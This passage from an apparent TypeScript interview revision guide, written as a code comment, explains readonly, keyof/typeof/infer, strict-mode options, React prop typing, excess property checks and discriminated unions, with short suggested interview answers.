 *      and don't require an import. Enums only if I need to iterate or use reverse mapping."
 *
 *
 * Q11. What is the difference between readonly and Readonly<T>?
 * - readonly (keyword): marks a single property as immutable.
 * - Readonly<T> (utility): makes ALL properties of T readonly at once.
 *
 * interface Point { readonly x: number; y: number; }
 * // p.x = 1 → Error. p.y = 2 → OK.
 *
 * const frozen: Readonly<Point> = { x: 1, y: 2 };
 * // frozen.y = 3 → Error.
 *
 * NOTE: Both are SHALLOW — nested objects can still be mutated.
 * For deep readonly you need a recursive mapped type or a library.
 *
 * 🗣️ "readonly prevents reassignment but it's shallow — nested objects aren't frozen."
 *
 *
 * Q12. What is keyof, typeof, and infer?
 *
 * keyof T     → union of all keys of type T as string literals
 *   type Keys = keyof { name: string; age: number }; // 'name' | 'age'
 *
 * typeof x    → get the TYPE of a variable/value (in a type position)
 *   const config = { port: 3000 };
 *   type Config = typeof config; // { port: number }
 *
 * infer       → declare a type variable INSIDE a conditional type
 *   type Unwrap<T> = T extends Array<infer Item> ? Item : T;
 *   type S = Unwrap<string[]>; // string
 *
 * 🗣️ "keyof + typeof together let me derive types from runtime values — no duplication."
 *
 *
 * Q13. strict mode — what does it enable?
 * - strictNullChecks    → null/undefined are NOT assignable to other types
 * - strictFunctionTypes → stricter function parameter checking (contravariance)
 * - strictBindCallApply → type-checks .bind(), .call(), .apply()
 * - noImplicitAny       → error when TS infers any
 * - noImplicitThis      → error when `this` has an implicit any type
 * Always turn on strict: true in tsconfig.json.
 *
 * 🗣️ "strict: true catches null dereferences and implicit any at compile time —
 *      it eliminates a whole class of runtime bugs."
 *
 *
 * Q14. How do you type React component props in TypeScript?
 *
 * // Function component
 * interface ButtonProps {
 *   label: string;
 *   onClick: () => void;
 *   variant?: 'primary' | 'secondary';
 * }
 * function Button({ label, onClick, variant = 'primary' }: ButtonProps) { ... }
 *
 * // Children
 * interface LayoutProps { children: React.ReactNode; }
 *
 * // Event handlers
 * onChange: React.ChangeEvent<HTMLInputElement>
 * onSubmit: React.FormEvent<HTMLFormElement>
 *
 * // Forwarding refs
 * const Input = React.forwardRef<HTMLInputElement, InputProps>((props, ref) => ...);
 *
 * 🗣️ "React.ReactNode is the widest children type — covers strings, elements, arrays, null."
 *
 *
 * Q15. What is excess property checking and when does it NOT apply?
 * - TS errors if you pass extra properties when assigning an OBJECT LITERAL directly.
 * - This check is SKIPPED when you assign through an intermediate variable.
 *
 * interface User { name: string; }
 * const u: User = { name: 'Alice', age: 30 };      // ❌ Error (literal)
 *
 * const obj = { name: 'Alice', age: 30 };
 * const u2: User = obj;                             // ✅ No error (variable)
 *
 * 🗣️ "Fresh object literals trigger excess property checks. Intermediate variables bypass them —
 *      useful to know when passing options objects to libraries."
 *
 *
 * Q16. What is a discriminated union and why is it useful?
 * - A union where each member has a COMMON LITERAL property (discriminant) that uniquely
 *   identifies it. Enables exhaustive type narrowing.
 *
 * type Result<T> =
 *   | { status: 'success'; data: T }
 *   | { status: 'error';   error: string }
 *   | { status: 'loading' };
 *
 * function render<T>(result: Result<T>) {
 *   switch (result.status) {
 *     case 'success': return result.data;     // TS knows data exists ✅
 *     case 'error':   return result.error;    // TS knows error exists ✅
 *     case 'loading': return 'Loading...';
 *     default: const _: never = result;       // exhaustiveness check ✅
 *   }
 * }
 *
 * 🗣️ "Discriminated unions + never in the default case give me compile-time exhaustiveness —
 *      adding a new variant without handling it becomes a type error."
 */


// ==============================================================
// 🎯 END OF REVISION GUIDE
// For interview prep: read full sections during study.
// Before the interview: scan all 🗣️ SAY IN INTERVIEW blocks.
// ==============================================================
